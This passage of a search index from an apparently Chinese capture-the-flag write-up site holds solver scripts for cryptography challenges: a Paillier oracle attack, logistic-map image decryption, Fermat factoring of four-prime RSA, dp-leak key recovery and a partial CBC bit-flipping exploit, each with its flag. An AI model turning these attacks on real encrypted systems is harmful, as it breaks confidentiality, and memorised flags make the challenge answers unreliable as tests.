guess.zip</p>"},{"location":"Writeup/Cryptography/Guess/#_1","title":"\u9898\u76ee\u63cf\u8ff0","text":"<p>\u9996\u5148\u5b83\u6709\u4e00\u4e2a\u5bc6\u94a5\u751f\u6210\u7684\u4ee3\u7801\u3002<code>key</code>\u662f\u4e00\u4e2a20*4\u7684\u77e9\u9635\uff0c\u5143\u7d20\u5747\u4e3a\u4e09\u4f4d\u6570\uff0c\u7136\u540e\u53f3\u4e58\u4e00\u4e2a\u968f\u673a1024\u4f4d\u77e9\u9635\u5f97\u5230\u3002\u6211\u4eec\u53ea\u77e5\u9053<code>key</code>\u77e9\u9635\u7b2c\u4e00\u884c\u7684\u5185\u5bb9\uff0c\u4ee5\u53ca\u7684\u503c\uff0c\u4f46\u662f\u4e0d\u77e5\u9053\u77e9\u9635\u7684\u5185\u5bb9\u3002</p> <p>\u731c\u6d4b\u53ef\u80fd\u53ef\u4ee5\u7528\u683c\u57fa\u89c4\u7ea6\u5148\u5f04\u51fa<code>key</code>\uff0c\u4f46\u662f\u6709\u611f\u89c9\u4e0d\u9760\u8c31\uff0c\u6211\u4eec\u5148\u653e\u4e00\u653e\uff0c\u5ba1\u8ba1\u4e00\u4e0boracle\u4ea4\u4e92\u7684<code>Guess.py</code>\u6587\u4ef6\u3002</p> <p>\u6587\u4ef6\u4e2d\u4f7f\u7528\u7684\u5bc6\u7801\u7b97\u6cd5\u662fPaillier\u7b97\u6cd5\uff0c\u8be5\u7b97\u6cd5\u652f\u6301\u540c\u6001\u52a0\u6cd5\u3002oracle\u4ea4\u4e92\u903b\u8f91\u5982\u4e0b\uff1a</p> <ol> <li>\u7ed9\u51fa\u7b97\u6cd5\u7684\u52a0\u5bc6\u5bc6\u94a5\uff08\u5373\u516c\u94a5\uff09\u3002</li> <li>\u7ed9\u51fa\u4e00\u4e2a\u5bc6\u6587\uff0coracle\u8fd4\u56de\u660e\u6587\u3002</li> <li>\u7ed9\u51fa\u4e24\u4e2a\u660e\u6587, oracle\u8fd4\u56de\u6216\u8005\u7684\u5176\u4e2d\u4e00\u9879\uff0c\u5176\u4e2d\u662f\u4e00\u968f\u673a\u7684\u5076\u6570\uff0c\u662f\u90a380\u4e2a100-1000\u7684\u6570\u6784\u6210\u7684\u4e00\u4e2a\u5217\u8868\u3002</li> <li>\u7ed9\u51fa\u4e00\u4e2a\u4e0d\u80fd\u548c\u7b2c3\u6b65\u89e3\u5bc6\u7ed3\u679c\u76f8\u540c\u7684\u5bc6\u6587\uff0coracle\u8fd4\u56de\u660e\u6587\u3002</li> <li>\u5224\u65ad\u7b2c3\u6b65\u4e2doracle\u8fd4\u56de\u4e86\u54ea\u4e2a\u5bc6\u6587\uff0c\u5e76\u544a\u8bc9oracle\u7ed3\u679c\u4ee5\u68c0\u9a8c\u3002\u5982\u679coracle\u68c0\u9a8c\u6210\u529f\uff0c\u5219\u8fdb\u884c\u4e0b\u4e00\u8f6e\uff1b\u5982\u679coracle\u68c0\u9a8c\u5931\u8d25\uff0c\u5219\u7ec8\u6b62\u8fde\u63a5\u3002 \u9700\u8981\u68c0\u9a8c\u6210\u529f32\u8f6e\u624d\u80fd\u62ff\u5230flag\u3002</li> </ol>"},{"location":"Writeup/Cryptography/Guess/#_2","title":"\u6211\u7684\u89e3\u7b54","text":"<p>\u672c\u8d28\u4e0a\u53ea\u9700\u8981\u628a<code>key</code>\u6062\u590d\u51fa\u6765\u5373\u53ef\u3002\u4f46\u662f\u6211\u4eec\u53ef\u4ee5\u5728\u4e0a\u9762\u7684\u7b2c\u56db\u6b65\u505a\u6587\u7ae0\u3002</p> <p>\u7b2c\u56db\u6b65\u53ef\u4ee5\u7528Paillier\u7b97\u6cd5\u7684\u6027\u8d28\u6765\u6784\u9020\u5bc6\u6587\u3002\u8bb0\uff0cPaillier\u7b97\u6cd5\u5bf9\u4e8e\u4e00\u4e2a\u660e\u6587\uff0c\u5148\u968f\u673a\u751f\u6210\u4e00\u4e2a\uff0c\u7136\u540e\u8ba1\u7b97\u3002</p> <p>\u90a3\u4e48\uff0c\u5982\u679c\u6211\u4eec\u5df2\u7ecf\u77e5\u9053\u4e24\u4e2a\u660e\u6587\u5bc6\u6587\u5bf9\uff0c\u6211\u4eec\u8ba1\u7b97</p> <p></p> <p>\u6b64\u65f6\u6211\u4eec\u4f1a\u53d1\u73b0\u8fd9\u4e2a\u65b0\u6784\u9020\u7684\u5bc6\u6587\u5bf9\u5e94\u660e\u6587\u3002</p> <p>\u56e0\u6b64\uff0c\u6211\u4eec\u53ef\u4ee5\u4ee4\u4e3aoracle\u6240\u7ed9\u7684\u5bc6\u6587\uff0c\u5e76\u4f7f\u7528\u9898\u76ee\u6240\u7ed9\u7684\u516c\u94a5\u5f97\u5230\u53e6\u4e00\u4e2a\u660e\u6587\u5bc6\u6587\u5bf9\uff0c\u8b6c\u5982\u4ee4\uff0c\u7136\u540e\u7528\u548c\u52a0\u5bc6\u5f97\u5230\uff0c\u5e76\u6784\u9020\u5bc6\u6587</p> <p></p> <p>\u7136\u540e\u5c31\u53ef\u4ee5\u5728oracle\u7684\u7b2c\u56db\u6b65\u8f93\u5165\u8fd9\u4e2a\uff0c\u8fd9\u6837oracle\u6240\u89e3\u51fa\u7684\u660e\u6587\u5c31\u662f</p> <p></p> <p>\u56e0\u4e3a\u9898\u76ee\u6240\u7ed9\u7684<code>key</code>\u662f\u56fa\u5b9a\u7684\uff0c\u4e5f\u5c31\u662f\u8bf4\u662f\u56fa\u5b9a\u7684\uff0c\u6240\u4ee5oracle\u89e3\u51fa\u7684\u660e\u6587\u4e5f\u662f\u6709\u9650\u7684\uff0880\u4e2a\uff09\uff0c\u8fd9\u5c31\u53d8\u6210\u4e86\u4e00\u4e2a80\u4e2a\u6837\u672c\u7684\u4e8c\u5206\u7c7b\u95ee\u9898\u3002\u6211\u4eec\u53ef\u4ee5\u628a\u6240\u8f93\u5165\u7684\u548c\u56fa\u5b9a\uff0c\u53ef\u4ee5\u591a\u6b21\u548coracle\u4ea4\u4e92\uff0c\u5148\u5c1d\u8bd5\u731c\u6d4b\u7b54\u6848\uff0c\u6839\u636eoracle\u7684\u68c0\u9a8c\u7ed3\u679c\u5f97\u5230\u82e5\u5e72\u7684\u5148\u9a8c\u77e5\u8bc6\u3002</p> <p>\u7136\u540e\u53ea\u8981\u5148\u9a8c\u77e5\u8bc6\u8db3\u591f\u591a\uff0c\u90a3\u5c31\u80fd\u4fdd\u8bc1\u5f88\u5927\u6982\u7387\u731c\u5bf9\u3002\u731c\u6d4b\u7b54\u6848\u4ee3\u7801\u5982\u4e0b\uff1a</p> <pre><code>from hashlib import sha256\nimport string\nimport itertools\nfrom pwn import *\nfrom Crypto.Util.number import *\nimport random\n\ndef enc(n, g, m):\n    while 1:\n        r = random.randint(2, n - 1)\n        if GCD(r, n) == 1:\n            break\n    c = (pow(g, m, n ** 2) * pow(r, n, n ** 2)) % (n ** 2)\n    return c\n\nwith open('gao_log_3', 'a') as f:\n    while (True):\n        conn = remote('47.104.85.225', 57811)\n\n        # SHA-256(?+hUWmo9BJ34LI) == 3919fa0f116d1a87c97d98dd43e08f77b090df5c88b1417c1c7e2c006a200aef\n        s = conn.recvline().strip().decode()\n        s2 = s[10:22]\n        ans = s[-64:]\n\n        for i in itertools.product(string.ascii_letters + string.digits, repeat=4):\n            s1 = ''.join(i)\n            ss = s1 + s2\n            if (sha256(ss.encode()).hexdigest() == ans):\n                conn.sendline(s1)\n                break\n\n        while (True):\n            conn.recvuntil('n = ')\n            n = conn.recvline()\n            n = int(n)\n\n            conn.recvuntil('g = ')\n            g = conn.recvline()\n            g = int(g)\n\n            conn.sendlineafter('Please give me one decimal ciphertext.', '2')\n            conn.recvuntil('This is the corresponding plaintext.\\n')\n            mm = conn.recvline()\n            mm = int(mm)\n\n            conn.sendlineafter('Give me m0.', '40343')\n            conn.sendlineafter('Give me m1.', '52051')\n            conn.recvuntil('This is a ciphertext.\\n')\n            c = conn.recvline()\n            c = int(c)\n\n            mm = 2\n            c2 = enc(n, g, mm)\n            cc = (c * c2) % (n ** 2)\n            conn.sendlineafter('Please give me one decimal ciphertext', str(cc))\n            conn.recvuntil('This is the corresponding plaintext.\\n')\n            m2 = conn.recvline()\n            m2 = int(m2)\n\n            conn.sendlineafter('m1 -&gt; c1)?', '0')\n            s = conn.recvuntil('!')\n            if (b'Sorry') in s:\n                f.write(f'{m2}, 1\\n')\n                conn.close()\n                break\n            else:\n                f.write(f'{m2}, 0\\n')\n</code></pre> <p>\u5229\u7528\u731c\u6d4b\u7b54\u6848\u6240\u5f97\u7684\u77e5\u8bc6\u5e93\u8fdb\u884c\u4ea4\u4e92\u7684\u4ee3\u7801\u5982\u4e0b\uff1a</p> <pre><code>from hashlib import sha256\nimport string\nimport itertools\nimport random\nfrom pwn import *\nfrom Crypto.Util.number import *\n\ndef enc(n, g, m):\n    while 1:\n        r = random.randint(2, n - 1)\n        if GCD(r, n) == 1:\n            break\n    c = (pow(g, m, n ** 2) * pow(r, n, n ** 2)) % (n ** 2)\n    return c\n\nm2ans = {}\ncnt = 0\nfor i in range(1, 5):\n    with open(f'gao_log_{i}', 'r') as f:\n        s = f.read()\n\n\n    for sline in s.splitlines():\n        m, ans = map(int, sline.split(','))\n        m2ans[m] = ans\n        cnt += 1\n\nprint(len(m2ans))\nconn = remote('47.104.85.225', 57811)\n# SHA-256(?+hUWmo9BJ34LI) == 3919fa0f116d1a87c97d98dd43e08f77b090df5c88b1417c1c7e2c006a200aef\ns = conn.recvline().strip().decode()\ns2 = s[10:22]\nans = s[-64:]\n\nfor i in itertools.product(string.ascii_letters + string.digits, repeat=4):\n    s1 = ''.join(i)\n    ss = s1 + s2\n    if (sha256(ss.encode()).hexdigest() == ans):\n        conn.sendline(s1)\n        break\nfor i in range(32):\n    conn.recvuntil('n = ')\n    n = conn.recvline()\n    n = int(n)\n\n    conn.recvuntil('g = ')\n    g = conn.recvline()\n    g = int(g)\n\n    conn.sendlineafter('Please give me one decimal ciphertext.', '2')\n    conn.recvuntil('This is the corresponding plaintext.\\n')\n    mm = conn.recvline()\n    mm = int(mm)\n\n    conn.sendlineafter('Give me m0.', '40343')\n    conn.sendlineafter('Give me m1.', '52051')\n    conn.recvuntil('This is a ciphertext.\\n')\n    c = conn.recvline()\n    c = int(c)\n\n    mm = 2\n    c2 = enc(n, g, mm)\n    cc = (c * c2) % (n ** 2)\n    conn.sendlineafter('Please give me one decimal ciphertext', str(cc))\n    conn.recvuntil('This is the corresponding plaintext.\\n')\n    m2 = conn.recvline()\n    m2 = int(m2)\n    if (m2 in m2ans):\n        print('Find')\n        conn.sendlineafter('m1 -&gt; c1)?', str(m2ans[m2]))\n    else:\n        print('Guess')\n        conn.sendlineafter('m1 -&gt; c1)?', '0')\n    s = conn.recvuntil('!')\n    if (b'Sorry') in s:\n        print(f'GG {i}')\n        conn.close()\n        break\n\nconn.interactive()\n</code></pre>"},{"location":"Writeup/Cryptography/Guess/#flag","title":"Flag","text":"<pre><code>flag{e87fdfb6-8007-4e1c-861f-5bde3c8badb3}\n</code></pre>"},{"location":"Writeup/Cryptography/Guess/#reference","title":"Reference","text":"<p>Writeup from https://zhuanlan.zhihu.com/p/402690414</p>"},{"location":"Writeup/Cryptography/MedicalImage/","title":"MedicalImage","text":"<p>Category: Cryptography</p> <p>Source: \u5dc5\u5cf0\u6781\u5ba2\u8d5b 2021</p> <p>Author: unknown</p> <p>Score: 25</p>"},{"location":"Writeup/Cryptography/MedicalImage/#solution","title":"Solution","text":"<p>\u4e00\u4e2a\u56fe\u7247\u52a0\u5bc6\u811a\u672c, \u51fd\u6570<code>f(x)</code>\u88ab\u9690\u85cf\u4e86, \u4f46\u7ed9\u4e86\u63d0\u793a, \u662f<code>logistic map</code>, (\u5728b\u7ad9\u770b\u4e0b\u89c6\u9891, \u6570\u5b66\u771f\u7684\u597d\u795e\u5947\u554a).\u800c\u4e14\u53c2\u6570rr\u662f\u6700\u5927\u5408\u6cd5\u503c, \u4e5f\u5c31\u662f44, \u90a3\u4e48\u51fd\u6570<code>f(x)</code>\u4e3a</p> <p>f(x)=4x(1\u2212x)f(x)=4x(1\u2212x)</p> <p>\u7136\u540e\u5c31\u662f\u5bf9\u7740\u52a0\u5bc6\u6d41\u7a0b\u5199\u89e3\u5bc6\u4e86\u2026. \u6ca1\u6709\u5565\u7279\u522b\u7684 \u9006\u7740\u52a0\u5bc6\u8fc7\u7a0b\u5199\u89e3\u5bc6\u5c31\u884c, p0,c0\u5c31\u90a3\u51e0\u4e2a\u503c\u7206\u7834\u5c31\u884c, \u4e00\u5f00\u59cb\u968f\u4fbf\u62ff101,201\u8bd5\u4e86\u4e0b\u2026\u76f4\u63a5\u5bf9\u4e86</p> <pre><code>from decimal import *\nfrom PIL import Image\nimport numpy as np\nfrom time import time\ngetcontext().prec = 20\n\n\nR = Decimal(4)\nr1 = Decimal('0.478706063089473894123')\nr2 = Decimal('0.613494245341234672318')\nr3 = Decimal('0.946365754637812381837')\nconst = 10 ** 14\nim = Image.open(\n    r'flag_enc.bmp'\n)\nsize = im.size\nw,h = size\nim = np.array(im)\n\n\n\ndef f(x):\n    return Decimal(4 * x * (1 - x))\n\nfor i in range(200):\n    r1 = f(r1)\n    r2 = f(r2)\n    r3 = f(r3)\n\nS = time()\np0 = 101\nc0 = 201\nfor x in range(w):\n    for y in range(h):\n        k = int(round(const*r3))%256\n        k = bin(k)[2:].ljust(8,'0')\n        k = int(k[p0%8:]+k[:p0%8],2)\n        r3 = f(r3)\n        m0 = ((k ^ im[y,x] ^ c0 ) - k) % 256\n        c0 = im[y,x]\n        p0 = m0\n        im[y,x] = m0\narr = []\nfor x in range(w):\n    for y in range(h):\n        x1 = int(round(const*r1))%w\n        y1 = int(round(const*r2))%h\n        arr += [(x,y,x1,y1)]\n        r1 = f(r1)\n        r2 = f(r2)\nfor z in arr[::-1]:\n    x,y,x1,y1 = z\n    tmp = im[y,x]\n    im[y,x] = im[y1,x1]\n    im[y1,x1] = tmp  \nm = Image.new('P', size,'white')\npixels = m.load()\nfor i in range(m.size[0]):\n    for j in range(m.size[1]):\n        pixels[i,j] = (int(im[j][i]))\nm.save(r'flag.bmp')\nprint(time()-S)\n</code></pre>"},{"location":"Writeup/Cryptography/RSAssss/","title":"RSAssss","text":"<p>Category: Cryptography</p> <p>Source: \u7965\u4e91\u676f2020</p> <p>Author: unknown</p> <p>Score: 25</p>"},{"location":"Writeup/Cryptography/RSAssss/#description","title":"Description","text":"<p>more factors,more strong</p>"},{"location":"Writeup/Cryptography/RSAssss/#solution","title":"Solution","text":"<pre><code>from Crypto.Util.number import *\nfrom gmpy2 import next_prime\n\n\np = getPrime(512)\nq = getPrime(512)\n\n\nn = p * q * next_prime(p) * next_prime(q)\ne = 0x10001\n\n\nflag = b\"flag{xxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxx}\"\ncipher = pow(bytes_to_long(flag), e, n)\n\n\nprint(n, cipher)\n\n\n#8030860507195481656424331455231443135773524476536419534745106637165762909478292141556846892146553555609301914884176422322286739546193682236355823149096731058044933046552926707682168435727800175783373045726692093694148718521610590523718813096895883533245331244650675812406540694948121258394822022998773233400623162137949381772195351339548977422564546054188918542382088471666795842185019002025083543162991739309935972705871943787733784491735500905013651061284020447578230135075211268405413254368439549259917312445348808412659422810647972872286215701325216318641985498202349281374905892279894612835009186944143298761257\n#330412463971933434999766363211057930667393277770584064857577467142742413428768098831412931259336108760624381952829861013179707826235130739683198539755539064015139113863343195174674815661046358247964556177919498180612989800987651789945084087556967597676515560844679920369992744883500475670715128104485967669553337375579827389250319475394899794765310069084188092544505917549431419860547502393956775040990721765429143061510225852399839423143679690263507799582947734731675473993898081429330428931841744349301970407316458550521765857021498915017512375703812538099605076157202198657393415547064109167866445108006571926\n</code></pre> <p>\u56db\u7d20\u6570\u7684RSA\u653b\u51fb\uff0c\u66fe\u7ecf\u8003\u8fc7\uff0c\u76f4\u63a5\u4e0a\u811a\u672c</p> <pre><code># -*- coding: utf-8 -*-\n\n\nfrom Crypto.Util.number import GCD, inverse, long_to_bytes\nimport gmpy2\nn = 8030860507195481656424331455231443135773524476536419534745106637165762909478292141556846892146553555609301914884176422322286739546193682236355823149096731058044933046552926707682168435727800175783373045726692093694148718521610590523718813096895883533245331244650675812406540694948121258394822022998773233400623162137949381772195351339548977422564546054188918542382088471666795842185019002025083543162991739309935972705871943787733784491735500905013651061284020447578230135075211268405413254368439549259917312445348808412659422810647972872286215701325216318641985498202349281374905892279894612835009186944143298761257 \nc = 3304124639719334349997663632110579306673932777705840648575774671427424134287680988314129312593361087606243819528298610131797078262351307396831985397555390640151391138633431951746748156610463582479645561779194981806129898009876517899450840875569675976765155608446799203699927448835004756707151281044859676695533373755798273892503194753948997947653100690841880925445059175494314198605475023939567750409907217654291430615102258523998394231436796902635077995829477347316754739938980814293304289318417443493019704073164585505217658570214989150175123757038125380996050761572021986573934155470641091678664451080065719261207\ne = 0x10001\ndef fermat_factorization(N):\n    Factor = []\n    gmpy2.get_context().precision = 2048\n    a = int(gmpy2.sqrt(N))\n    a2 = a * a\n    b2 = gmpy2.sub(a2, N)\n    while True:\n        a += 1\n        b2 = a * a - N\n        if gmpy2.is_square(b2):\n            b2 = gmpy2.mpz(b2)\n            gmpy2.get_context().precision = 2048\n            b = int(gmpy2.sqrt(b2))\n            Factor.append([a + b, a - b])\n        if len(Factor) == 2:\n            break\n    return Factor\n\n\nif __name__ == \"__main__\":\n    factor = fermat_factorization(n)\n    [X1, Y1] = factor[0]\n    [X2, Y2] = factor[1]\n    assert X1 * Y1 == n\n    assert X2 * Y2 == n\n    p1 = gmpy2.mpz(GCD(X1, X2))\n    p2 = gmpy2.mpz(X1 / p1)\n    q1 = gmpy2.mpz(GCD(Y1, Y2))\n    q2 = gmpy2.mpz(Y1 / q1)\n    assert p1 * p2 * q1 * q2 == n\n    phi = gmpy2.mpz(0)\n    phi = (p1 - 1) * (q1 - 1) * (p2 - 1) * (q2 - 1)\n    d = inverse(e, phi)\n    flag = long_to_bytes(pow(c, d, n))\n    print(flag)\n</code></pre> <p></p>"},{"location":"Writeup/Cryptography/RSAssss/#flag","title":"Flag","text":"<p>flag{2bef1a3e-5598-404e-b022-f593a230ce58}</p>"},{"location":"Writeup/Cryptography/RSAssss/#reference","title":"Reference","text":"<p>Writeup from https://mp.weixin.qq.com/s/0b9nQRxkbu7mDPji_Y8Ghw</p>"},{"location":"Writeup/Cryptography/Random_RSA/","title":"Random_RSA","text":"<p>Category: Cryptography</p> <p>Source: \u7965\u4e91\u676f2021</p> <p>Author: unknown</p> <p>Score: 10</p>"},{"location":"Writeup/Cryptography/Random_RSA/#description","title":"Description","text":"<p>\u4e00\u628a\u68ad\uff0c\u597d\u50cf\u4e0d\u884c\u54e6\u3002</p> <p> Random_RSA.zip</p>"},{"location":"Writeup/Cryptography/Random_RSA/#_1","title":"\u9898\u76ee\u63cf\u8ff0","text":"<p>\u9898\u76ee\u57fa\u4e8eRSA\uff0c\u3002\u9898\u76ee\u7ed9\u51faflag\u52a0\u5bc6\u7684\u5bc6\u6587\u3002</p> <p>\u9898\u76ee\u7ed9\u51fa\u4e86\u5173\u4e8e\u7684\u63d0\u793a\uff1a\u9898\u76ee\u7ed9\u4e86\u968f\u673a\u79cd\u5b50\u5217\u8868\u3002\u5bf9\u4e8e\u6bcf\u4e2a\u968f\u673a\u79cd\u5b50\uff0c\u9898\u76ee\u4f1a\u57fa\u4e8e\u8fd9\u4e2a\u968f\u673a\u79cd\u5b50\u751f\u6210\u4e00\u4e2a\u968f\u673a\u6570\u5217\u8868\uff0c\u6bcf\u6b21\u90fd\u4ece\u5217\u8868\u91cc\u9762\u6307\u5b9a\u4f4d\u7f6e\u62a0\u6389\u4e00\u4e2a\u6570\uff0c\u5e76\u4e14\u7ed9\u51fa\u5176\u4ed6\u6570\u7ec4\u6210\u7684\u5217\u8868\uff1b\u7528\u88ab\u62a0\u6389\u90a3\u4e2a\u6570\u4f5c\u4e3a\u6d41\u5bc6\u94a5\uff0c\u4e0e\u7684\u5341\u8fdb\u5236\u8868\u793a\u5b57\u7b26\u4e32\u5bf9\u5e94\u5b57\u8282\u8fdb\u884c\u5f02\u6216\uff0c\u5f97\u5230\u4e00\u4e2a\u5bc6\u6587\u3002</p>"},{"location":"Writeup/Cryptography/Random_RSA/#_2","title":"\u6211\u7684\u89e3\u7b54","text":"<p>\u9996\u5148\u6211\u4eec\u5148\u5c1d\u8bd5\u641e\u51fa\uff1a\u6211\u4eec\u901a\u8fc7\u8bbe\u968f\u673a\u79cd\u5b50\uff0c\u5f97\u5230\u5217\u8868\u3002\u53d1\u73b0\u53ea\u6709python 2\u751f\u6210\u7684\u5217\u8868\u624d\u80fd\u5bf9\u5f97\u4e0a\uff0c\u6240\u4ee5\u6211\u4eec\u9700\u8981\u7528python 2\u8dd1\u7a0b\u5e8f\uff0c\u5e76\u751f\u6210\u6b63\u786e\u7684\u6d41\u5bc6\u94a5\u3002\u7136\u540e\u5c31\u662f\u5f02\u6216\u5f97\u5230\u3002</p> <p>\u4e4b\u540e\u5c31\u662f\u6839\u636e\u679a\u4e3e\uff0c\u5c1d\u8bd5\u662f\u5426\u4e0d\u4e3a1\u3002\u82e5\u662f\u7684\u8bdd\uff0c\u90a3\u8fd9\u4e2a\u503c\u5c31\u662f\u3002\u8fdb\u800c\u5f97\u5230\u7684\u5206\u89e3\u5e76\u5bf9flag\u7684\u5bc6\u6587\u8fdb\u884c\u89e3\u5bc6\u3002\u5f97\u5230\u7684\u4ee3\u7801\u5982\u4e0b\uff1a</p> <pre><code>import random\nc2 = '[[58, 53, 122] [145, 124, 244] [5, 19, 192] [255, 23, 64] [57, 113, 194] [246, 205, 162] [112, 87, 95] [215, 147, 105] [16, 131, 38] [234, 36, 46] [68, 61, 146] [148, 61, 9] [139, 77, 32] [96, 56, 160] [121, 76, 17] [114, 246, 92] [178, 206, 60] [168, 147, 26] [168, 41, 68] [24, 93, 84] [175, 43, 88] [147, 97, 153] [42, 94, 45] [150, 103, 127] [68, 163, 62] [165, 37, 89] [219, 248, 59] [241, 182, 8] [140, 211, 146] [88, 226, 2] [48, 150, 56] [87, 109, 255] [227, 216, 65] [23, 190, 10] [5, 25, 64] [6, 12, 124] [53, 113, 124] [255, 192, 158] [61, 239, 5] [62, 108, 86] [123, 44, 64] [195, 192, 30] [30, 82, 95] [56, 178, 165] [68, 77, 239] [106, 247, 226] [17, 46, 114] [91, 71, 156] [157, 43, 182] [146, 6, 42] [148, 143, 161] [108, 33, 139] [139, 169, 157] [71, 140, 25] [28, 153, 26] [241, 221, 235] [28, 131, 141] [159, 111, 184] [47, 206, 11] [220, 152, 157] [41, 213, 97] [4, 220, 10] [77, 13, 248] [94, 140, 110] [25, 250, 226] [218, 102, 109] [189, 238, 66] [91, 18, 131] [23, 239, 190] [159, 33, 72] [183, 78, 208] [209, 213, 101] [111, 50, 220] [166, 104, 233] [170, 144, 10] [187, 87, 175] [195, 59, 104] [165, 179, 179] [99, 247, 153] [195, 61, 100] [223, 159, 165] [230, 93, 184] [87, 28, 35] [35, 122, 38] [158, 188, 163] [229, 192, 222] [12, 12, 192] [207, 95, 224] [127, 113, 137] [22, 114, 143] [13, 45, 144] [70, 140, 211] [57, 101, 42] [132, 62, 129] [40, 128, 124] [1, 132, 161] [164, 33, 133] [252, 201, 32] [8, 18, 247] [1, 88, 55] [201, 135, 186] [101, 254, 125] [236, 196, 39] [148, 24, 103] [101, 29, 253] [97, 156, 64] [90, 103, 91] [50, 48, 80] [206, 22, 93] [11, 114, 174] [61, 132, 247] [215, 32, 232] [95, 128, 90] [57, 35, 228] [163, 143, 107] [178, 250, 28] [64, 107, 225] [106, 115, 207] [85, 134, 21] [118, 201, 76] [234, 34, 22] [241, 236, 122] [111, 185, 127] [1, 26, 164] [254, 57, 117] [243, 27, 32] [161, 88, 80] [50, 165, 93] [87, 182, 216] [184, 159, 63] [167, 166, 123] [37, 78, 33] [186, 81, 58] [48, 3, 239] [70, 186, 13] [56, 108, 178] [54, 55, 235] [105, 180, 105] [16, 194, 98] [136, 11, 41] [18, 203, 79] [185, 114, 170] [148, 181, 223] [118, 57, 160] [23, 250, 181] [235, 219, 228] [44, 151, 38] [185, 224, 134] [42, 162, 122] [3, 9, 158] [129, 245, 2] [66, 241, 92] [80, 124, 36]]'\nres2 = [55, 5, 183, 192, 103, 32, 211, 116, 102, 120, 118, 54, 120, 145, 185, 254, 77, 144, 70, 54, 193, 73, 64, 0, 79, 244, 190, 23, 215, 187, 53, 176, 27, 138, 42, 89, 158, 254, 159, 133, 78, 11, 155, 163, 145, 248, 14, 179, 23, 226, 220, 201, 5, 71, 241, 195, 75, 191, 237, 108, 141, 141, 185, 76, 7, 113, 191, 48, 135, 139, 100, 83, 212, 242, 21, 143, 255, 164, 146, 119, 173, 255, 140, 193, 173, 2, 224, 205, 68, 10, 77, 180, 24, 23, 196, 205, 108, 28, 243, 80, 140, 4, 98, 76, 217, 70, 208, 202, 78, 177, 124, 10, 168, 165, 223, 105, 157, 152, 48, 152, 51, 133, 190, 202, 136, 204, 44, 33, 58, 4, 196, 219, 71, 150, 68, 162, 175, 218, 173, 19, 201, 100, 100, 85, 201, 24, 59, 186, 46, 130, 147, 219, 22, 81]\nseeds2 = [4827, 9522, 552, 880, 7467, 7742, 9425, 4803, 6146, 4366, 1126, 4707, 1138, 2367, 1081, 5577, 4592, 5897, 4565, 2012, 2700, 1331, 9638, 7741, 50, 824, 8321, 7411, 6145, 1271, 7637, 5481, 8474, 2085, 2421, 590, 7733, 9427, 3278, 5361, 1284, 2280, 7001, 8573, 5494, 7431, 2765, 827, 102, 1419, 6528, 735, 5653, 109, 4158, 5877, 5975, 1527, 3027, 9776, 5263, 5211, 1293, 5976, 7759, 3268, 1893, 6546, 4684, 419, 8334, 7621, 1649, 6840, 2975, 8605, 5714, 2709, 1109, 358, 2858, 6868, 2442, 8431, 8316, 5446, 9356, 2817, 2941, 3177, 7388, 4149, 4634, 4316, 5377, 4327, 1774, 6613, 5728, 1751, 8478, 3132, 4680, 3308, 9769, 8341, 1627, 3501, 1046, 2609, 7190, 5706, 3627, 8867, 2458, 607, 642, 5436, 6355, 6326, 1481, 9887, 205, 5511, 537, 8576, 6376, 3619, 6609, 8473, 2139, 3889, 1309, 9878, 2182, 8572, 9275, 5235, 6989, 6592, 4618, 7883, 5702, 3999, 925, 2419, 7838, 3073, 488, 21, 3280, 9915, 3672, 579]\n\nc2 = eval(c2.replace('] [', '], ['))\nmyc = []\nfor i in range(0, len(seeds2)):\n    random.seed(seeds2[i])\n    rands = []\n    for j in range(0,4):\n        rands.append(random.randint(0,255))\n    myc.append(rands[i % 4])\n\ndp = [x ^ y for x, y in zip(myc, res2)]\ndp = int(bytearray(dp))\n\nprint(dp)\n</code></pre> <p>\u5f97\u5230\u7684\u5206\u89e3\u8fdb\u800c\u89e3\u5bc6\u7684\u4ee3\u7801\u5982\u4e0b\uff1a</p> <pre><code>from Crypto.Util.number import *\n\nn=81196282992606113591233615204680597645208562279327854026981376917977843644855180528227037752692498558370026353244981467900057157997462760732019372185955846507977456657760125682125104309241802108853618468491463326268016450119817181368743376919334016359137566652069490881871670703767378496685419790016705210391\nct=61505256223993349534474550877787675500827332878941621261477860880689799960938202020614342208518869582019307850789493701589309453566095881294166336673487909221860641809622524813959284722285069755310890972255545436989082654705098907006694780949725756312169019688455553997031840488852954588581160550377081811151\n\ndp = 5372007426161196154405640504110736659190183194052966723076041266610893158678092845450232508793279585163304918807656946147575280063208168816457346755227057\n\ne=0x10001\n\nfor k in range(1, 100000):\n    p = (e * dp - 1) // k + 1\n    if (n % p == 0):\n        break\n\nq = n // p\nd = inverse(e, (p-1)*(q-1))\n\nm = pow(ct, d, n)\nprint(long_to_bytes(m))\n</code></pre>"},{"location":"Writeup/Cryptography/Random_RSA/#flag","title":"Flag","text":"<pre><code>flag{74281db3-c6f0-e59a-4da6-39b8c71250fe}\n</code></pre>"},{"location":"Writeup/Cryptography/Random_RSA/#reference","title":"Reference","text":"<p>Writeup from https://zhuanlan.zhihu.com/p/402690414</p>"},{"location":"Writeup/Cryptography/blowfishgame/","title":"blowfishgame","text":"<p>Category: Cryptography</p> <p>Source: \u7965\u4e91\u676f2020</p> <p>Author: unknown</p> <p>Score: 35</p>"},{"location":"Writeup/Cryptography/blowfishgame/#description","title":"Description","text":""},{"location":"Writeup/Cryptography/blowfishgame/#solution","title":"Solution","text":"<p>CBC \u7ffb\u8f6c\u653b\u51fb\u4f7f message \u524d 8 \u5b57\u8282\u4e3a get_flag\uff0c\u7136\u540e\u5c31\u662f\u7b80\u5355\u7684\u9010\u5b57\u8282\u7206\u7834\uff0c\u6211\u5168\u90fd\u9632\u51fa\u53bb\u4e86\uff0c\u9632\u51fa\u53bb\u4e86\u554a\u3002</p> <pre><code># -*- coding: utf-8 -*-\n# @Project: Hello Python!\n# @File   : exp\n# @Author : Nonuplebroken &lt;birkenwald.cn&gt;\n# @Date   : 2020-11-22\nfrom pwn import *\nimport string\nimport itertools\nfrom hashlib import sha384\nimport re\nimport base64\n\n\n\ndef PoW(part, hash_value):\n    alphabet = string.ascii_letters + string.digits\n    for x in itertools.product(alphabet, repeat=3):\n        nonce = ''.join(x)\n        if sha384(nonce + part).hexdigest() == hash_value:\n            return nonce\n\n\ndef xor(a, b):\n    assert len(a) == len(b)\n    return ''.join([chr(ord(a[i])^ord(b[i])) for i in range(len(a))])\n\n\nsh = remote('8.131.69.237', 15846)\n\ns1 = sh.recvuntil('Give me XXX:')\nre_res = re.search(r'sha384\\(XXX\\+([a-zA-Z0-9]{17})\\) == ([0-9a-f]{96})', 